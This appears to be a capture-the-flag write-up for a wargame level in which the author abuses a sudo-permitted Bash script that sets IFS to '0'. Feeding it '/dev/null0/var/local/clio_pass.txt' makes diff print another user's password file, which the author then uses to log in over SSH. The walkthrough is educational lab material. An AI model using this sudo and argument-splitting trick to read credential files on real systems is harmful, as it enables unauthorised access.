# 0x21

moving from `cassiopeia` to `clio`

---

The mission for this stage focused on user **clio** and her specific dislike for spaces:

```bash
cassiopeia@hades:~$ cat mission.txt 
################
# MISSION 0x21 #
################

## EN ##        
User clio hates spaces. 
```

### 1. Analysis and Sudo Privileges

Checking `sudo -l` revealed that user `cassiopeia` can run a specific Bash script as user `clio` without a password:

```bash
cassiopeia@hades:~$ sudo -l
...
User cassiopeia may run the following commands on hades:
    (clio) NOPASSWD: /bin/bash -c /usr/local/src/differences.sh
```

#### Code Review

The script `/usr/local/src/differences.sh` contains a flaw in how it parses arguments:

```bash
#!/bin/bash
echo File to compare:!
read differences
IFS=0 read file1 file2 <<< "$differences"

if [[ "$differences" =~ \ |\' ]]
then
   echo "No spaces!!"
else
/usr/bin/diff $file1 $file2
fi
```

* **Input Handling**: The script uses `read differences` to get user input.
* **The Flaw**: It sets the **Internal Field Separator (IFS)** to `0` (`IFS=0`). This means the shell will treat the character `0` as a delimiter to split the input into the variables `$file1` and `$file2`.
* **Space Filter**: It explicitly blocks the use of standard spaces or single quotes.

### 2. The Solution: Character-Based Parameter Splitting

To bypass the space restriction and read a file, I needed to provide two file paths separated by the digit `0`.

#### Step 1: Finding the Target

I searched the system for Clio's password file.

```bash
cassiopeia@hades:~$ find / -name "clio_pass.txt" 2>/dev/null
/var/local/clio_pass.txt
```

#### Step 2: Crafting the Payload

I executed the script with `sudo -u clio`. When prompted for a file to compare, I used `/dev/null` (an empty system file) and the path to the password file, using `0` as the separator.

```bash
cassiopeia@hades:~$ sudo -u clio /bin/bash -c /usr/local/src/differences.sh
File to compare:!
/dev/null0/var/local/clio_pass.txt
```

#### Step 3: Password Extraction

Because `/dev/null` is empty, the `diff` command reported all lines found in the second file as additions (prefixed with `>`).

```bash
0a1
> [REDACTED]
```

### 3. Explanation

* **IFS Manipulation**: The `IFS` variable determines how Bash splits strings into words. By setting it to `0`, the developer created a non-standard way to input multiple arguments.
* **Privilege Escalation**: Since the script ran with `clio` privileges via `sudo`, the `diff` command was able to read `/var/local/clio_pass.txt`, which is normally restricted from `cassiopeia`.
* **The Finding**: The string `[REDACTED]` printed by the `diff` command is the cleartext login password for user **clio**.

### 4. Execution

Using the retrieved password, I successfully established an SSH session as **clio**.

```bash
cassiopeia@hades:~$ ssh clio@localhost
...
clio@hades:~$ id
uid=2013(clio) gid=2013(clio) groups=2013(clio)
```
